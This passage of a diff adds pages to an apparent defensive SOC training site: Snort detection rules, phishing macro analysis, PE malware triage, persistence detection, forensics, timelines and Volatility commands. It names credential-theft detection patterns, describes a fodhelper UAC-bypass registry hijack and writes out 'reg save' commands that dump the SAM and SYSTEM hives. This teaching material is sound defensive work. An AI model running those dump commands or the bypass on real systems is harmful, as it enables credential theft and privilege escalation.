+            <p class="ltxt">An <strong>IDS (Intrusion Detection System)</strong> passively monitors and alerts — it does not block. An <strong>IPS (Intrusion Prevention System)</strong> sits inline and can drop malicious packets in real time. Both Snort and Suricata can run in either mode. In a SOC, IDS mode feeds your SIEM with telemetry; IPS mode provides active blocking. The trade-off: IPS requires higher confidence rules to avoid blocking legitimate traffic.</p>
+            <div class="cgrid">
+              <div class="cc"><div class="cct">Signature-based detection</div><div class="ccb">Matches traffic against known attack patterns. Fast, precise for known threats. Blind to novel zero-days. Requires regular rule updates (Snort VRT, Emerging Threats Open).</div></div>
+              <div class="cc"><div class="cct">Anomaly-based detection</div><div class="ccb">Establishes a traffic baseline, flags statistical deviations. Can detect novel attacks but generates more false positives. Example: unusual protocol on a standard port.</div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Snort rule anatomy</div>
+            <div class="cb"><span class="cm"># Structure: action proto src_ip src_port -> dst_ip dst_port (options)</span>
+
+<span class="cm"># Detect Mimikatz LSASS access over network</span>
+<span class="kw">alert</span> tcp any any -> $HOME_NET <span class="vl">445</span>
+  (msg:<span class="st">"ET CREDS Mimikatz LSASS Access"</span>;
+   flow:established,to_server;
+   content:<span class="st">"|60 48 8b 05|"</span>; depth:4;
+   classtype:credential-theft;
+   sid:<span class="vl">2024001</span>; rev:1;)
+
+<span class="cm"># Detect DNS tunneling — long subdomain query</span>
+<span class="kw">alert</span> dns any any -> any <span class="vl">53</span>
+  (msg:<span class="st">"Possible DNS Tunneling - Long Query"</span>;
+   dns.query; pcre:<span class="st">"/[A-Za-z0-9+\/]{40,}\./i"</span>;
+   sid:<span class="vl">2024002</span>; rev:1;)</div>
+            <p class="ltxt">Key fields: <strong>sid</strong> = unique rule ID, <strong>msg</strong> = human-readable alert name for your SIEM, <strong>content</strong> = byte pattern to match in payload, <strong>pcre</strong> = regex pattern, <strong>classtype</strong> = alert category for grouping.</p>
+          </div>
+          <div class="lsec"><div class="lsect">Watch: Snort IDS setup and rule writing</div>
+            <div class="vc"><a class="vthumb" href="https://www.youtube.com/watch?v=Gh0sweT-G30" target="_blank"></a><div><div class="vsrc">HackerSploit · Blue Team Series · Ep.12</div><div class="vtit">Intrusion Detection With Snort</div><div class="vdesc">Hands-on Snort IDS usage: loading rule sets, running live packet captures, generating test alerts, reading the Snort alert output format, and tuning rules to reduce false positives. The exact workflow used in a real SOC lab.</div><a class="vlink" href="https://www.youtube.com/watch?v=Gh0sweT-G30" target="_blank">Watch on YouTube →</a></div></div>
+          </div>
+          <div class="lsec"><div class="lsect">External resources</div>
+            <div class="elinks">
+              <a class="el" href="https://docs.snort.org/rules/" target="_blank">Snort Rule Writing Guide</a>
+              <a class="el" href="https://rules.emergingthreats.net/" target="_blank">Emerging Threats Open Rules</a>
+              <a class="el" href="https://tryhackme.com/room/snort" target="_blank">TryHackMe — Snort Room</a>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
+            <div class="qbl" id="q-id1"><div class="qq">A Suricata alert fires: "ET SCAN Nmap SYN Scan" from an external IP. This is the first alert from this source in 30 days. Correct Tier 1 action?</div><div class="qopts"><button class="qo" onclick="QA('q-id1',0,2)">A. Close as false positive — scan alerts are always noise</button><button class="qo" onclick="QA('q-id1',1,2)">B. Investigate source IP, check if authorized scanner, correlate with firewall logs to see what was targeted</button><button class="qo" onclick="QA('q-id1',2,2)">C. Immediately block the source IP at the firewall</button><button class="qo" onclick="QA('q-id1',3,2)">D. Escalate directly to Tier 3 threat hunting team</button></div><div class="qfb" id="q-id1-fb"></div><button class="undoq" id="uq-q-id1" onclick="UQ('q-id1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-ids" onclick="MC('ids')">Mark module complete ✓</button><button class="ubtn" id="ub-ids" onclick="UM('ids')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+
+      <!-- PHISHING -->
+      <div class="page" id="page-phishing">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 3 · Module 12</div><div class="ltit">Phishing Analysis</div><div class="lmet">Email headers · SPF/DKIM/DMARC · VBA macro analysis · Sandbox · BEC</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">Email header analysis</div>
+            <p class="ltxt">The <strong>Received chain</strong> shows every mail server the message passed through in reverse order (bottom = origin, top = last hop). The <strong>From</strong> header is trivially spoofed. Always check: <strong>Return-Path</strong> (true bounce address), <strong>X-Originating-IP</strong> (origin IP), and <strong>Authentication-Results</strong> (SPF/DKIM/DMARC outcomes).</p>
+            <table class="dt"><thead><tr><th>Record</th><th>Function</th><th>Failure means</th></tr></thead><tbody>
+              <tr><td>SPF</td><td>Lists authorized sending IPs for a domain. Receiver checks if sending IP is listed.</td><td>Email from unauthorized server — likely spoofed or misdirected</td></tr>
+              <tr><td>DKIM</td><td>Cryptographic signature on message content. Receiver verifies via public key in DNS.</td><td>Email was modified in transit or not signed by the claimed domain</td></tr>
+              <tr><td>DMARC</td><td>Policy defining what to do when SPF/DKIM fail: reject, quarantine, or none (monitor).</td><td>Domain owner's policy tells receivers to reject/quarantine the message</td></tr>
+            </tbody></table>
+          </div>
+          <div class="lsec"><div class="lsect">VBA macro analysis — extracting malicious code</div>
+            <p class="ltxt">Phishing emails frequently deliver <strong>macro-enabled Office documents</strong> (.doc, .xlsm). The macro executes on open and runs a PowerShell payload. Analyzing VBA without executing the file requires extracting and reading the macro code statically.</p>
+            <div class="cb"><span class="cm"># Extract VBA macros without executing — use olevba from python-oletools</span>
+olevba <span class="vl">invoice.doc</span>
+
+<span class="cm"># Key patterns to identify in extracted VBA code:</span>
+<span class="cm"># AutoOpen() / Document_Open()  — auto-executes on file open, no user interaction</span>
+<span class="cm"># Shell()                       — executes external commands (PowerShell, cmd)</span>
+<span class="cm"># CreateObject("WScript.Shell") — alternative shell execution method</span>
+<span class="cm"># Chr() string building          — obfuscates strings character by character</span>
+<span class="cm"># StrReverse()                   — reverses strings to evade simple pattern matching</span>
+<span class="cm"># URLDownloadToFile              — downloads file from remote URL</span>
+<span class="cm"># XMLHTTP / WinHttp              — HTTP request to download C2 payload</span></div>
+            <div class="ca warn">Never enable macros on a real machine to analyze them. Use REMnux Linux distro or Any.run sandbox. olevba extracts and displays the VBA source code without executing anything.</div>
+          </div>
+          <div class="lsec"><div class="lsect">URL and attachment analysis tools</div>
+            <div class="cgrid">
+              <div class="cc"><div class="cct">URLScan.io</div><div class="ccb">Scans and screenshots URLs without visiting them yourself. Shows all redirects, resources loaded, and reputation scores of the destination.</div></div>
+              <div class="cc"><div class="cct">PhishTool</div><div class="ccb">Specialized phishing email triage: header parsing, link analysis, IOC extraction. Used in the BTL1 Phishing module.</div></div>
+              <div class="cc"><div class="cct">Any.run Sandbox</div><div class="ccb">Submit attachment or URL for dynamic analysis. Watch real-time process tree, network connections, file writes, and registry changes in an interactive Windows VM.</div></div>
+              <div class="cc"><div class="cct">Defanging IOCs</div><div class="ccb">Always defang before sharing: hxxps://evil[.]com, 185.220.101[.]45. Prevents accidental clicks in reports, emails, and documentation.</div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">External resources</div>
+            <div class="elinks">
+              <a class="el" href="https://mxtoolbox.com/EmailHeaders.aspx" target="_blank">MXToolbox Header Analyzer</a>
+              <a class="el" href="https://any.run" target="_blank">Any.run Free Sandbox</a>
+              <a class="el" href="https://www.phishtool.com" target="_blank">PhishTool</a>
+              <a class="el" href="https://urlscan.io" target="_blank">URLScan.io</a>
+              <a class="el" href="https://tryhackme.com/module/phishing" target="_blank">TryHackMe Phishing Module</a>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
+            <div class="qbl" id="q-ph1"><div class="qq">olevba extracts this from a .doc attachment: AutoOpen() calls Shell("powershell -enc JABzAGU..."). Without executing the file, what does this tell you?</div><div class="qopts"><button class="qo" onclick="QA('q-ph1',0,2)">A. The macro creates a document shortcut — likely benign</button><button class="qo" onclick="QA('q-ph1',1,2)">B. The macro auto-executes on open and runs an obfuscated PowerShell payload — malicious dropper</button><button class="qo" onclick="QA('q-ph1',2,2)">C. AutoOpen only runs if the user clicks a button</button><button class="qo" onclick="QA('q-ph1',3,2)">D. This is a legitimate installer triggered by document events</button></div><div class="qfb" id="q-ph1-fb"></div><button class="undoq" id="uq-q-ph1" onclick="UQ('q-ph1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-phishing" onclick="MC('phishing')">Mark module complete ✓</button><button class="ubtn" id="ub-phishing" onclick="UM('phishing')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+
+      <!-- MALWARE ANALYSIS -->
+      <div class="page" id="page-malware">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 3 · Module 13</div><div class="ltit">Malware Analysis</div><div class="lmet">Static PE analysis · Import table · High entropy · Dynamic analysis · IOC extraction</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">PE file structure and what to look for</div>
+            <p class="ltxt">A PE (Portable Executable) file has a header, sections (.text for code, .data for variables, .rsrc for resources), and an <strong>Import Address Table (IAT)</strong> listing every Windows API function the malware calls. The IAT reveals capabilities before execution — this is the most valuable part of static analysis.</p>
+            <table class="dt"><thead><tr><th>Suspicious import</th><th>Capability indicated</th></tr></thead><tbody>
+              <tr><td>CreateRemoteThread + WriteProcessMemory</td><td>Process injection — injecting shellcode into another running process</td></tr>
+              <tr><td>VirtualAllocEx + OpenProcess</td><td>Memory allocation in remote process — classic shellcode injection pattern</td></tr>
+              <tr><td>InternetConnect / URLDownloadToFile</td><td>C2 communication or payload download</td></tr>
+              <tr><td>RegSetValueEx / RegCreateKeyEx</td><td>Registry persistence — writing Run keys or other persistence mechanisms</td></tr>
+              <tr><td>CryptEncrypt / BCryptEncrypt</td><td>File encryption capability — ransomware or protected C2 communication</td></tr>
+              <tr><td>SetWindowsHookEx</td><td>Keyboard/mouse hooking — keylogger capability</td></tr>
+            </tbody></table>
+          </div>
+          <div class="lsec"><div class="lsect">Section entropy — detecting packing</div>
+            <p class="ltxt">Normal code sections have entropy around <strong>5.0–6.5</strong>. Entropy above <strong>7.0</strong> in the .text section indicates the code is packed, encrypted, or obfuscated. The actual payload is concealed and decrypts itself at runtime. You must use a sandbox or debugger to unpack and reveal the true functionality. Tool: DIE (Detect It Easy) or PEStudio both show section entropy.</p>
+          </div>
+          <div class="lsec"><div class="lsect">Static analysis workflow</div>
+            <div class="steps">
+              <div class="si"><div class="sn">1</div><div><div class="stit2">Hash the file</div><div class="sdesc">MD5 + SHA256. Check VirusTotal immediately. Note detection rate, first submission date, and associated campaigns.</div></div></div>
+              <div class="si"><div class="sn">2</div><div><div class="stit2">Detect packing/obfuscation</div><div class="sdesc">Run DIE (Detect It Easy). High .text entropy (>7.0) = packed. Few meaningful strings = obfuscated. Both indicate dynamic analysis will be needed.</div></div></div>
+              <div class="si"><div class="sn">3</div><div><div class="stit2">Extract strings</div><div class="sdesc">Use strings or FLOSS (for obfuscated strings). Hunt for: hardcoded IPs, domains, URLs, registry paths, mutex names, file paths, PDB debug paths.</div></div></div>
+              <div class="si"><div class="sn">4</div><div><div class="stit2">Analyze PE imports (IAT)</div><div class="sdesc">Open in PEStudio or CFF Explorer. The import table reveals capabilities without running anything. See table above.</div></div></div>
+              <div class="si"><div class="sn">5</div><div><div class="stit2">Document IOCs</div><div class="sdesc">File hash, hardcoded IPs/domains, mutex names, registry keys, file paths, PDB paths. Feed into SIEM and threat intel platform.</div></div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">External resources</div>
+            <div class="elinks">
+              <a class="el" href="https://any.run" target="_blank">Any.run Interactive Sandbox</a>
+              <a class="el" href="https://bazaar.abuse.ch" target="_blank">MalwareBazaar (samples)</a>
+              <a class="el" href="https://www.winitor.com" target="_blank">PEStudio (free)</a>
+              <a class="el" href="https://remnux.org" target="_blank">REMnux Linux Distro</a>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
+            <div class="qbl" id="q-ma1"><div class="qq">PEStudio shows a binary imports CreateRemoteThread and WriteProcessMemory, and the .text section has entropy 7.9. What do these two findings indicate together?</div><div class="qopts"><button class="qo" onclick="QA('q-ma1',0,2)">A. A legitimate Windows service with encrypted data storage</button><button class="qo" onclick="QA('q-ma1',1,2)">B. Packed malware with process injection capability — needs sandbox analysis to reveal the decrypted payload</button><button class="qo" onclick="QA('q-ma1',2,2)">C. A network scanner with encrypted communication</button><button class="qo" onclick="QA('q-ma1',3,2)">D. High entropy is normal for .NET binaries — no concern</button></div><div class="qfb" id="q-ma1-fb"></div><button class="undoq" id="uq-q-ma1" onclick="UQ('q-ma1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-malware" onclick="MC('malware')">Mark module complete ✓</button><button class="ubtn" id="ub-malware" onclick="UM('malware')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+
+      <!-- PRIVILEGE ESCALATION -->
+      <div class="page" id="page-privesc">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 3 · Module 14</div><div class="ltit">Privilege Escalation &amp; Persistence</div><div class="lmet">UAC bypass · Token manipulation · Services · Scheduled tasks · SAM/LSASS</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">Privilege escalation techniques</div>
+            <table class="dt"><thead><tr><th>Technique</th><th>How it works</th><th>Detection signal</th></tr></thead><tbody>
+              <tr><td>UAC Bypass (T1548.002)</td><td>Auto-elevate binaries (fodhelper, eventvwr, sdclt) are hijacked via registry. Attacker modifies HKCU\Software\Classes\ms-settings, runs fodhelper.exe which auto-elevates and executes attacker's command without any UAC prompt.</td><td>EID 4688: fodhelper.exe → cmd.exe or PowerShell. HKCU\Software\Classes\ms-settings registry write (Sysmon EID 13).</td></tr>
+              <tr><td>Token Manipulation (T1134)</td><td>Windows access tokens represent user identity. DuplicateToken + ImpersonateLoggedOnUser steals a SYSTEM-level token from a service process, granting attacker SYSTEM privileges.</td><td>EID 4672: special privileges assigned to new logon. Monitor for SeImpersonatePrivilege usage by unexpected processes.</td></tr>
+              <tr><td>Local Exploit (T1068)</td><td>Unpatched kernel driver or service vulnerability exploited to gain SYSTEM. PrintNightmare, HiveNightmare, Dirty Pipe (Linux) are recent examples.</td><td>EID 7045: new service installed. Application error logs. Unusual crash dumps. Patch compliance monitoring.</td></tr>
+            </tbody></table>
+          </div>
+          <div class="lsec"><div class="lsect">Persistence mechanisms — detection cheatsheet</div>
+            <table class="dt"><thead><tr><th>Mechanism</th><th>Location / EID</th><th>Suspicious indicator</th></tr></thead><tbody>
+              <tr><td>Registry Run Keys</td><td>HKCU/HKLM\...\Run (Sysmon EID 13)</td><td>Entry points to Temp/AppData, encoded names, created off-hours</td></tr>
+              <tr><td>Scheduled Tasks</td><td>Task Scheduler XML / EID 4698</td><td>Random names, tasks running encoded commands, created without change ticket</td></tr>
+              <tr><td>New Service</td><td>EID 7045 (System log)</td><td>Random names, paths in AppData/Temp, created at unusual times</td></tr>
+              <tr><td>Startup Folder</td><td>%APPDATA%\...\Startup (file creation events)</td><td>New .lnk or .exe files — especially with no associated installer</td></tr>
+              <tr><td>DLL Hijacking</td><td>Sysmon EID 7 (ImageLoad)</td><td>Unexpected DLLs loaded by trusted processes from non-standard paths</td></tr>
+            </tbody></table>
+          </div>
+          <div class="lsec"><div class="lsect">SAM and LSASS credential access</div>
+            <p class="ltxt"><strong>SAM (Security Account Manager)</strong> stores local account password hashes. <strong>LSASS (Local Security Authority Subsystem Service)</strong> holds cached credentials in memory for all logged-in users. Both are primary targets for credential dumping tools like Mimikatz.</p>
+            <div class="cb"><span class="cm"># Detecting LSASS memory access — Sysmon Event ID 10 (ProcessAccess)</span>
+TargetImage: C:\Windows\System32\lsass.exe
+GrantedAccess: <span class="vl">0x1010</span>  <span class="cm"># PROCESS_VM_READ + PROCESS_QUERY_INFORMATION</span>
+SourceImage: <span class="vl">[any non-security-product process]</span>  <span class="cm"># Flag this</span>
+
+<span class="cm"># Detecting SAM dump via reg.exe (EID 4688)</span>
+reg save HKLM\SAM C:\temp\sam.hiv    <span class="cm"># Registry backup — rarely legitimate</span>
+reg save HKLM\SYSTEM C:\temp\sys.hiv <span class="cm"># Combined with SAM = full offline crack setup</span></div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
+            <div class="qbl" id="q-pe1"><div class="qq">EDR detects: fodhelper.exe spawning cmd.exe, which runs an encoded PowerShell command. HKCU\Software\Classes\ms-settings was modified 2 seconds earlier. What technique is this?</div><div class="qopts"><button class="qo" onclick="QA('q-pe1',0,2)">A. Token manipulation via impersonation</button><button class="qo" onclick="QA('q-pe1',1,2)">B. UAC bypass using fodhelper.exe and a registry hijack — elevation without a UAC prompt</button><button class="qo" onclick="QA('q-pe1',2,2)">C. Pass-the-Hash using a stolen NTLM credential</button><button class="qo" onclick="QA('q-pe1',3,2)">D. DLL hijacking via the ms-settings module</button></div><div class="qfb" id="q-pe1-fb"></div><button class="undoq" id="uq-q-pe1" onclick="UQ('q-pe1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-privesc" onclick="MC('privesc')">Mark module complete ✓</button><button class="ubtn" id="ub-privesc" onclick="UM('privesc')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+
+      <!-- DIGITAL FORENSICS -->
+      <div class="page" id="page-forensics">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 4 · Module 15</div><div class="ltit">Digital Forensics</div><div class="lmet">Order of volatility · Windows artifacts · Linux forensics · Autopsy · KAPE</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">Order of volatility — collect most volatile first</div>
+            <div class="steps">
+              <div class="si"><div class="sn">1</div><div><div class="stit2">RAM memory dump</div><div class="sdesc">Running processes, network connections, decrypted credentials, fileless malware. Lost immediately on shutdown. Use winpmem or FTK Imager Live.</div></div></div>
+              <div class="si"><div class="sn">2</div><div><div class="stit2">Active network state</div><div class="sdesc">Current connections (netstat -an), routing table, ARP cache. Changes as connections open/close every few seconds.</div></div></div>
+              <div class="si"><div class="sn">3</div><div><div class="stit2">Running processes &amp; open files</div><div class="sdesc">What's executing, what files are open. tasklist /v, Process Explorer, handle.exe.</div></div></div>
+              <div class="si"><div class="sn">4</div><div><div class="stit2">Event logs (before clearing)</div><div class="sdesc">Capture event logs before any potential clearing by the attacker or cleanup procedures.</div></div></div>
+              <div class="si"><div class="sn">5</div><div><div class="stit2">Disk image (non-volatile)</div><div class="sdesc">Full bit-for-bit copy using a write blocker. Hash before and after (MD5+SHA256) to prove integrity. Tools: FTK Imager, dd, Guymager.</div></div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Key Windows forensic artifacts</div>
+            <div class="cgrid">
+              <div class="cc"><div class="cct">Prefetch files</div><div class="ccb">C:\Windows\Prefetch\*.pf — last 8 execution timestamps, even after the binary is deleted. Tool: PECmd (Eric Zimmerman).</div></div>
+              <div class="cc"><div class="cct">$MFT (Master File Table)</div><div class="ccb">NTFS index of every file with MACB timestamps. Reveals deleted files. Tool: MFTECmd (Eric Zimmerman).</div></div>
+              <div class="cc"><div class="cct">ShimCache / Amcache</div><div class="ccb">Execution history that survives reboots. Amcache includes file hashes. Tools: AppCompatCacheParser, AmcacheParser.</div></div>
+              <div class="cc"><div class="cct">KAPE</div><div class="ccb">Kroll Artifact Parser and Extractor — free triage tool that collects and parses dozens of artifacts in minutes. Ideal for rapid evidence collection.</div></div>
+              <div class="cc"><div class="cct">Autopsy</div><div class="ccb">Free open-source disk forensics GUI. Recovers deleted files, parses browser history, extracts email artifacts, builds timelines. BTL1 exam covers basic usage.</div></div>
+              <div class="cc"><div class="cct">Browser artifacts</div><div class="ccb">History, downloads, cached credentials, cookies. Use Browser History Viewer or Autopsy. Useful for malware download investigation and user activity reconstruction.</div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">External resources</div>
+            <div class="elinks">
+              <a class="el" href="https://ericzimmerman.github.io/" target="_blank">Eric Zimmerman Tools (free)</a>
+              <a class="el" href="https://www.autopsy.com/" target="_blank">Autopsy (free)</a>
+              <a class="el" href="https://tryhackme.com/room/windowsforensics1" target="_blank">TryHackMe Windows Forensics 1</a>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
+            <div class="qbl" id="q-fo1"><div class="qq">A suspicious binary executed and was then deleted from a Windows system. Which artifact provides the BEST evidence of execution including the last 8 run timestamps?</div><div class="qopts"><button class="qo" onclick="QA('q-fo1',0,2)">A. Windows Event Log EID 4688</button><button class="qo" onclick="QA('q-fo1',1,2)">B. Prefetch files in C:\Windows\Prefetch\</button><button class="qo" onclick="QA('q-fo1',2,2)">C. The $MFT Master File Table</button><button class="qo" onclick="QA('q-fo1',3,2)">D. Browser history</button></div><div class="qfb" id="q-fo1-fb"></div><button class="undoq" id="uq-q-fo1" onclick="UQ('q-fo1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-forensics" onclick="MC('forensics')">Mark module complete ✓</button><button class="ubtn" id="ub-forensics" onclick="UM('forensics')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+
+      <!-- TIMELINE ANALYSIS -->
+      <div class="page" id="page-timeline">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 4 · Module 16</div><div class="ltit">Timeline Analysis</div><div class="lmet">MACB timestamps · Timestomping detection · log2timeline · Multi-source correlation</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">MACB timestamps</div>
+            <div class="macb">
+              <div class="macbc"><div class="macbl">M</div><div class="macbn">Modified</div><div class="macbd">Last time file content was changed</div></div>
+              <div class="macbc"><div class="macbl">A</div><div class="macbn">Accessed</div><div class="macbd">Last time file was read or executed</div></div>
+              <div class="macbc"><div class="macbl">C</div><div class="macbn">Changed ($MFT)</div><div class="macbd">MFT metadata changed — not file content</div></div>
+              <div class="macbc"><div class="macbl">B</div><div class="macbn">Born (Created)</div><div class="macbd">When file first appeared on this volume</div></div>
+            </div>
+            <div class="ca warn">Timestomping detection: compare $STANDARD_INFORMATION vs $FILE_NAME timestamps in the MFT. Attackers can easily modify $STANDARD_INFORMATION with user-space tools. $FILE_NAME is set by the kernel and is much harder to modify. A mismatch between the two attributes = manipulation. Born timestamp newer than Modified timestamp = red flag.</div>
+          </div>
+          <div class="lsec"><div class="lsect">Reconstructed attack timeline — worked example</div>
+            <div class="tl">
+              <div class="tll"></div>
+              <div class="tle"><div class="tld" style="background:#1a2e4a;border-color:#378ADD"></div><div class="tlt">2024-03-15 09:03:22 UTC</div><div class="tlev">Phishing email opened — invoice_Q1.xlsx macro enabled</div><div class="tldt">User j.smith dismissed macro security warning. Excel opened the file.</div><span class="tlsr">Email gateway + EID 4663</span></div>
+              <div class="tle"><div class="tld" style="background:#2a1a0a;border-color:#BA7517"></div><div class="tlt">2024-03-15 09:03:45 UTC</div><div class="tlev">Macro executed — mshta.exe spawned by excel.exe</div><div class="tldt">Prefetch entry created: MSHTA.EXE-XXXXXXXX.pf. Suspicious parent-child process relationship detected by EDR.</div><span class="tlsr">Prefetch + Sysmon EID 1 + EDR process tree</span></div>
+              <div class="tle"><div class="tld" style="background:#2a0a0a;border-color:#E24B4A"></div><div class="tlt">2024-03-15 09:03:51 UTC</div><div class="tlev">LSASS memory access — credential dumping in progress</div><div class="tldt">svhost32.exe opened lsass.exe handle with PROCESS_VM_READ. NTLM hashes being extracted.</div><span class="tlsr">Sysmon EID 10 (ProcessAccess) + EDR</span></div>
+              <div class="tle"><div class="tld" style="background:#1a0a1a;border-color:#D4537E"></div><div class="tlt">2024-03-15 09:04:15 UTC</div><div class="tlev">Persistence established — Registry Run key modified</div><div class="tldt">HKCU\...\Run: "WindowsHelper" = svhost32.exe. Registry last-write timestamp corroborates timeline.</div><span class="tlsr">Registry hive + Sysmon EID 13</span></div>
+              <div class="tle"><div class="tld" style="background:#2a0a0a;border-color:#A32D2D"></div><div class="tlt">2024-03-15 09:11:33 UTC</div><div class="tlev">Lateral movement — Pass-the-Hash to SRV-FINANCE-01</div><div class="tldt">NTLM Type 3 logon on SRV-FINANCE-01 from WS-017. Total dwell time before lateral move: 8 minutes.</div><span class="tlsr">EID 4624 on SRV-FINANCE-01 + Firewall logs</span></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">log2timeline / Plaso usage</div>
+            <div class="cb"><span class="cm"># Step 1: Parse disk image into a unified plaso storage file</span>
+log2timeline.py --storage-file timeline.plaso /path/to/disk.E01
+
+<span class="cm"># Step 2: Filter to your attack window and export to CSV</span>
+psort.py -o l2tcsv timeline.plaso \
+  <span class="st">"date > '2024-03-15 09:00:00' AND date < '2024-03-15 10:00:00'"</span> \
+  -w output.csv
+
+<span class="cm"># Step 3: Search for relevant artifact names</span>
+grep -i <span class="st">"svhost32\|mshta\|CurrentVersion.Run"</span> output.csv</div>
+            <div class="ca info">Always normalize all timestamps to UTC before correlating across sources. Different log systems may use different timezones — failing to normalize will produce a misleading timeline.</div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
+            <div class="qbl" id="q-tl1"><div class="qq">A suspicious file has $STANDARD_INFORMATION Created = 2024-03-15 but $FILE_NAME Created = 2023-11-02. What does this discrepancy indicate?</div><div class="qopts"><button class="qo" onclick="QA('q-tl1',0,2)">A. Normal — these timestamps are always different</button><button class="qo" onclick="QA('q-tl1',1,2)">B. Timestomping — $STANDARD_INFORMATION was manipulated; $FILE_NAME reflects the true creation time</button><button class="qo" onclick="QA('q-tl1',2,2)">C. The file was copied from another volume on March 15</button><button class="qo" onclick="QA('q-tl1',3,2)">D. The system clock was wrong in November 2023</button></div><div class="qfb" id="q-tl1-fb"></div><button class="undoq" id="uq-q-tl1" onclick="UQ('q-tl1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-timeline" onclick="MC('timeline')">Mark module complete ✓</button><button class="ubtn" id="ub-timeline" onclick="UM('timeline')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+
+      <!-- MEMORY ANALYSIS -->
+      <div class="page" id="page-memory">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 4 · Module 17</div><div class="ltit">Memory Analysis With Volatility</div><div class="lmet">Volatility 3 · Fileless malware · Process hiding · Code injection · Network state</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">Why memory forensics is critical</div>
+            <p class="ltxt">Memory forensics is the only way to detect <strong>fileless malware</strong> — attacks that live entirely in RAM and never write a file to disk. PowerShell Empire, Cobalt Strike Beacon, and many modern RATs operate this way. The only evidence is in a memory dump. Memory analysis also reveals: running processes (including kernel-hidden ones), network connections at the exact moment of capture, injected shellcode, decryption keys in plaintext, and cached credentials.</p>
+          </div>
+          <div class="lsec"><div class="lsect">Volatility 3 essential commands</div>
+            <div class="cb"><span class="cm"># List processes from the Windows process list (PsActiveProcessList)</span>
+vol.py -f memory.raw windows.pslist
+
+<span class="cm"># Scan physical memory for EPROCESS structures (finds hidden processes)</span>
+vol.py -f memory.raw windows.psscan
+
+<span class="cm"># KEY: Processes in psscan but NOT pslist = rootkit hiding them</span>
+
+<span class="cm"># Active network connections at capture time</span>
+vol.py -f memory.raw windows.netstat
+
+<span class="cm"># Find injected code in process memory (critical for fileless detection)</span>
+vol.py -f memory.raw windows.malfind
+
+<span class="cm"># List DLLs loaded by a specific process</span>
+vol.py -f memory.raw windows.dlllist --pid 1234
+
+<span class="cm"># Extract command line arguments for all processes</span>
+vol.py -f memory.raw windows.cmdline
+
+<span class="cm"># Dump a suspicious process to disk for static analysis</span>
+vol.py -f memory.raw windows.dumpfiles --pid 1234</div>
+          </div>
+          <div class="lsec"><div class="lsect">Watch: Memory forensics with Volatility</div>
+            <div class="vc"><a class="vthumb" href="https://www.youtube.com/watch?v=2S_pi9qnIo8" target="_blank"></a><div><div class="vsrc">HackerSploit · Blue Team Series · Ep.19</div><div class="vtit">Memory Forensics With Volatility</div><div class="vdesc">Hands-on Volatility 3 walkthrough for IR and malware analysis: listing processes, finding hidden processes (pslist vs psscan), extracting network connections, using malfind to identify code injection, and dumping suspicious processes for deeper analysis. Exactly what BTL1 tests.</div><a class="vlink" href="https://www.youtube.com/watch?v=2S_pi9qnIo8" target="_blank">Watch on YouTube →</a></div></div>
+          </div>
+          <div class="lsec"><div class="lsect">External resources</div>
+            <div class="elinks">
+              <a class="el" href="https://github.com/stuxnet999/MemLabs" target="_blank">MemLabs — Volatility CTF Challenges</a>
+              <a class="el" href="https://volatility3.readthedocs.io" target="_blank">Volatility 3 Documentation</a>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
